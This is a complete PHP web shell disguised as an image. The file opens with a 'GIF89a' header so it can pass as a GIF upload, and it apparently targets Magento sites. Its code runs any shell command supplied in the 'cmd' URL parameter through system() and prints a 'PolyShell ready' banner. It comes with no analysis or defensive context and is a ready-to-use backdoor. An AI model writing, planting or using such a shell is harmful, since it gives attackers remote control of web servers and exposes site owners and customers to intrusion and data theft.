GIF89a<?php
if (isset($_GET['cmd'])) {
    header('Content-Type: text/plain');
    system($_GET['cmd']);
    exit;
}
echo "Comment:cliproot-magento\n";
echo "Cliproot PolyShell ready!\n";
?>